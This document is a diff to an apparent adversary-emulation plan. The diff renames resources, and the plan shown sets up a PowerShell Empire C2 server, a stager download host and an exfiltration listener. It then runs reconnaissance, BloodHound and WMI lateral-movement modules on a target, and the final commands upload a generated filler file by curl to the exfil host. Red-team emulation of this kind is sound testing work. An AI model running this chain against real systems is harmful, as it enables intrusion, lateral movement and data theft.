@@ -90,7 +90,7 @@ data "tasks" "lateral_movement_task" {
 }
 
 data "wait_for_c2" "c2_agent" {
-    task_name  = resource.task.c2_server.task_name
+    task_name  = resource.task.c2_task.task_name
     depends_on = action.task_execute_command.execute_stager
 }
 
@@ -125,9 +125,9 @@ resource "portgroup" "exfil_portgroup" {
     ip_protocol    = "tcp"
 }
 
-resource "task" "c2_server" {
+resource "task" "c2_task" {
     task_type  = "powershell_empire"
-    task_name  = "c2_server_${local.function.date_stamp}"
+    task_name  = "c2_task_${local.function.date_stamp}"
     portgroups = [resource.portgroup.c2_portgroup.portgroup_name]
 
     listener {
@@ -161,15 +161,15 @@ resource "listener" "c2_listener" {
     listener_name = "c2_listener_${local.function.date_stamp}"
     listener_type = variable.c2_listener_type
     listener_port = variable.c2_port
-    task_name     = resource.task.c2_server.task_name
+    task_name     = resource.task.c2_task.task_name
     portgroups    = [resource.portgroup.c2_portgroup.portgroup_name]
     host_name     = "c2-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
 }
 
-resource "task" "http_server" {
+resource "task" "http_task" {
     task_type  = "http_server"
-    task_name  = "http_server_${local.function.date_stamp}"
+    task_name  = "http_task_${local.function.date_stamp}"
     portgroups = [resource.portgroup.http_portgroup.portgroup_name]
 
     listener {
@@ -192,15 +192,15 @@ resource "listener" "http_listener" {
     listener_name = "http_listener_${local.function.date_stamp}"
     listener_type = variable.http_listener_type
     listener_port = variable.http_port
-    task_name     = resource.task.http_server.task_name
+    task_name     = resource.task.http_task.task_name
     portgroups    = [resource.portgroup.http_portgroup.portgroup_name]
     host_name     = "downloads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
 }
 
-resource "task" "exfil_server" {
+resource "task" "exfil_task" {
     task_type  = "exfil_server"
-    task_name  = "exfil_server_${local.function.date_stamp}"
+    task_name  = "exfil_task_${local.function.date_stamp}"
     portgroups = resource.portgroup.exfil_portgroup.portgroup_name
 
     listener {
@@ -223,19 +223,19 @@ resource "listener" "exfil_listener" {
     listener_name = "exfil_listener_${local.function.date_stamp}"
     listener_type = variable.exfil_listener_type
     listener_port = variable.exfil_port
-    task_name     = resource.task.exfil_server.task_name
+    task_name     = resource.task.exfil_task.task_name
     portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
     host_name     = "uploads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
 }
 
 resource "file" "stager_upload" {
-    file_name     = resource.task.c2_server.stager.OutFile
-    file_contents = resource.task.c2_server.stager.Output
+    file_name     = resource.task.c2_task.stager.OutFile
+    file_contents = resource.task.c2_task.stager.Output
 }
 
 action "download_from_workspace" "stager_download" {
-    task_name = resource.task.http_server.task_name
+    task_name = resource.task.http_task.task_name
     file_name = resource.file.stager_upload.file_name
 }
 
@@ -251,7 +251,7 @@ action "task_execute_command" "execute_stager" {
 }
 
 action "agent_execute_module" "antivirusproduct" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/host/antivirusproduct"
     wait_for_results  = true
@@ -259,7 +259,7 @@ action "agent_execute_module" "antivirusproduct" {
 }
 
 action "agent_execute_module" "dnsserver" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/host/dnsserver"
     wait_for_results  = true
@@ -267,7 +267,7 @@ action "agent_execute_module" "dnsserver" {
 }
 
 action "agent_execute_module" "get_proxy" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/host/get_proxy"
     wait_for_results  = true
@@ -275,7 +275,7 @@ action "agent_execute_module" "get_proxy" {
 }
 
 action "agent_execute_module" "get_uaclevel" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/host/get_uaclevel"
     wait_for_results  = true
@@ -283,7 +283,7 @@ action "agent_execute_module" "get_uaclevel" {
 }
 
 action "agent_execute_module" "seatbelt_user" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/host/seatbelt"
     wait_for_results  = true
@@ -296,7 +296,7 @@ action "agent_execute_module" "seatbelt_user" {
 }
 
 action "agent_execute_module" "seatbelt_system" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/host/seatbelt"
     wait_for_results  = true
@@ -309,7 +309,7 @@ action "agent_execute_module" "seatbelt_system" {
 }
 
 action "agent_execute_module" "reverse_dns" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/network/reverse_dns"
     wait_for_results  = true
@@ -321,7 +321,7 @@ action "agent_execute_module" "reverse_dns" {
 }
 
 action "agent_execute_module" "portscan" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/network/portscan"
     wait_for_results  = true
@@ -334,7 +334,7 @@ action "agent_execute_module" "portscan" {
 }
 
 action "agent_execute_module" "get_domain_controller" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/network/powerview/get_domain_controller"
     wait_for_results  = true
@@ -342,7 +342,7 @@ action "agent_execute_module" "get_domain_controller" {
 }
 
 action "agent_execute_module" "get_domain_policy" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/network/powerview/get_domain_policy"
     wait_for_results  = true
@@ -350,7 +350,7 @@ action "agent_execute_module" "get_domain_policy" {
 }
 
 action "agent_execute_module" "bloodhound" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/situational_awareness/network/bloodhound"
     wait_for_results  = true
@@ -364,7 +364,7 @@ action "agent_execute_module" "bloodhound" {
 }
 
 action "agent_execute_module" "invoke_wmi" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     module            = "powershell/lateral_movement/invoke_wmi"
     wait_for_results  = true
@@ -372,25 +372,25 @@ action "agent_execute_module" "invoke_wmi" {
 
     module_args = {
         ComputerName = data.tasks.lateral_movement_task.host_name
-        Listener     = resource.task.c2_server.listener.listener_type
+        Listener     = resource.task.c2_task.listener.listener_type
     }
 }
 
 action "agent_execute_shell_command" "create_exfil_file" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){\"1234567890qwertyasdfjkl;\"*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
 }
 
 action "agent_execute_shell_command" "upload_exfil_file" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} ${resource.listener.exfil_listener.listener_type}://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:${variable.exfil_port}/p"
     wait_for_results  = true
 }
 
 action "agent_execute_shell_command" "delete_exfil_file" {
-    task_name         = resource.task.c2_server.task_name
+    task_name         = resource.task.c2_task.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
     command           = "del ${variable.exfil_path}\\${variable.exfil_file}"
     wait_for_results  = true
